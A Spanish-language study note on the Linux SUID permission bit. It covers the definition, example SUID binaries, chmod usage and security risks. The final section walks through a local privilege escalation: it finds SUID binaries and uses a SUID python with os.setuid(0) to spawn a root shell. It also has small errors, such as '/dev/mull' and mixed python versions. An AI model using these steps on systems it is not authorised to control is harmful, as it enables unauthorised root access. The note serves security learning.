#  SUID

### Definición 

> [!INFO] SUID (**S**et **U**ser **ID**)
> Es un permiso especial que se aplica a archivos ejecutables. Cuando se configura el bit SUID en un archivo, significa que cuando cualquier usuario ejecuta ese archivo, el programa se ejecuta con los privilegios del propietario del archivo, en lugar de con los privilegios del usuario que lo ejecuta.
^definicion

### ¿Cómo funciona el SUID?

1. **Propietario del archivo:** El bit SUID se establece en archivos ejecutables. Cuando un archivo tiene el bit SUID activado, se ejecutará con los permisos del propietario del archivo, no con los permisos del usuario que lo ejecuta. Esto es particularmente útil cuando un archivo necesita realizar tareas que requieren permisos más elevados, como tareas administrativas.

2. **Permiso especial:** En términos de permisos, SUID es un bit adicional que se agrega a los permisos tradicionales de lectura, escritura y ejecución. Se representa como una "s" en lugar de la "x" en la parte de los permisos correspondiente al propietario del archivo.

   - Por ejemplo, un archivo con permisos `rwsr-xr-x` tiene el bit SUID activado, lo que significa que se ejecutará con los permisos del propietario.

### Ejemplos de uso del SUID

1. **[[passwd|/bin/passwd]]**:
   - El comando `passwd` se utiliza para cambiar la contraseña de un usuario. Este comando necesita permisos elevados porque debe modificar el archivo `/etc/shadow`, donde se almacenan las contraseñas cifradas. Aunque un usuario normal no tiene permisos de escritura en este archivo, al tener el bit SUID, `passwd` puede realizar estos cambios con los permisos del usuario root.

   ```bash
   ls -l /bin/passwd
   ```

   ```plaintext
   -rwsr-xr-x 1 root root 54256 Jun 14 15:22 /bin/passwd
   ```
   - Aquí, la `s` en lugar de la `x` en los permisos del propietario indica que el bit SUID está activado.

2. [[sudo|/usr/bin/sudo]]:
   - El comando `sudo` permite a un usuario ejecutar comandos con privilegios elevados. Al tener el bit SUID, el comando se ejecuta con los permisos del propietario del archivo (que es root), lo que permite que los usuarios autorizados puedan ejecutar comandos como si fueran root.

   ```bash
   ls -l /usr/bin/sudo
   ```

   ```plaintext
   -rwsr-xr-x 1 root root 123456 Feb 18 12:34 /usr/bin/sudo
   ```

3. [[mount|/bin/mount]] y [[umount|/bin/umount]]:
   - Los comandos `mount` y `umount` se utilizan para montar y desmontar sistemas de archivos. Solo el usuario root tiene normalmente permisos para realizar estas operaciones, pero con el bit SUID activado, los usuarios normales pueden montar y desmontar sistemas de archivos permitidos.

   ```bash
   ls -l /bin/mount /bin/umount
   ```

   ```plaintext
   -rwsr-xr-x 1 root root 117760 May 25 10:23 /bin/mount
   -rwsr-xr-x 1 root root 102400 May 25 10:23 /bin/umount
   ```

4. **[[chsh | /usr/bin/chsh]]**:
   - El comando `chsh` permite a los usuarios cambiar su shell de login predeterminado. Para modificar esta información en el archivo `/etc/passwd`, el comando necesita permisos elevados.

   ```bash
   ls -l /usr/bin/chsh
   ```

   ```plaintext
   -rwsr-xr-x 1 root root 40960 Jun 14 15:22 /usr/bin/chsh
   ```

### Configuración del SUID

Para establecer el bit SUID en un archivo, se utiliza el comando `chmod`. Por ejemplo:

```bash
chmod u+s archivo
# o 
chmod 4000
```

Esto añadirá el bit SUID al archivo especificado.

Para quitar el bit SUID:

```bash
chmod u-s archivo
```

### Riesgos de seguridad

El uso indebido del SUID puede representar un riesgo de seguridad. Si un archivo con SUID está mal configurado o si contiene vulnerabilidades, un usuario malintencionado podría explotar esos permisos elevados para realizar acciones no autorizadas, como acceder a archivos o modificar configuraciones del sistema. Por ello, es fundamental asegurarse de que solo se establezca el bit SUID en archivos donde sea absolutamente necesario y de que esos archivos estén bien auditados.

### **Ejemplo practico**

(Suponiendo que `python` tiene `suid`) En caso contrario puedo agregarle el `4000`, considerando que el privilegio base de `python3.9` es `755`, pondría `chmod 4755` o `chmod u+s`

Busco desde la raiz archivos con el previlegio 4000, o sea el suid. Como se supone que el usuario no es root, mando los errores o accesos denegados al /dev/null para que no moleste en pantalla
```bash
find / -type f -perm -4000 2>/dev/mull # 
# En caso de querer buscar SGID, pondría -2000 en vez de -4000
```

Veo que me encuentra que `python3.12` tiene SUID, lo reviso con `ls -l`
```bash
which python3.12 | xargs ls -l
> `-rwsr-xr-x`
```

Esto significa que siendo el usuario que sea, voy a poder ejecutar python3.9 como propietario, o sea como root. 

```bash
python3.12 # ejecuto python
```
```python
import os 
```
```python
os.setuid(0) # el 0 es root
```
Logro acceso al root.

```python
os.system("whoami")
```
```
root
```

> [!TIP ]
> Hay una forma más comoda para poner comandos que es directamente pedirle desde python que me de una bash o un zsh ya como root.
>```python
>os.system("zsh")
>```

listo, tengo una zsh como root, acceso completo al sistema